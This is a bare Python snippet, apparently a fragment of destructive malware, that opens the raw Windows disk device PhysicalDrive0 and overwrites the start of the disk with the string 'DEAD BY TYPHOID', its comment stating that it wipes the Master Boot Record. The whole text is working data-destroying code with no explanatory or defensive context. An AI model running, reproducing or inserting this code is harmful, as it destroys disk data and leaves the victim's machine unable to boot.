with open("\\\\.\\PhysicalDrive0", "wb") as mbr:
    mbr.write(b"DEAD BY TYPHOID")  # Wipes the Master Boot Record
